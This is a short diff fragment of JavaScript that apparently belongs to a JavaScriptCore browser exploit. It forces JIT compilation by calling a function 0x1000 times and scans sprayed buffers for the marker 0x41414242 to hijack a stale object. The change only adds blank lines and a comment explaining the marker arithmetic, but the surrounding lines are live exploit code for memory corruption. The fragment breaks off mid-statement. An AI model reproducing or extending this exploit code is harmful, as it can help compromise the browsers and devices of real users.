@@ -43,6 +43,7 @@ function dgc() {
  	}
  }
 
+
  function swag() {
  	if (bufs[0]) return;
  	dgc();
@@ -180,9 +181,10 @@ function dgc() {
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
  	for (var z = 0; z < 0x1000; z++) fc();
 	 
+	 
  	for (i = 0; i < bufs.length; i++) {
  		for (k = 0; k < bufs[0].length; k++) {
- 			if (bufs[i][k] == 0x41414242) {
+ 			if (bufs[i][k] == 0x41414242) { // Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
  				stale[0] = fc;
  				fcp = bufs[i][k];
  				stale[0] = {
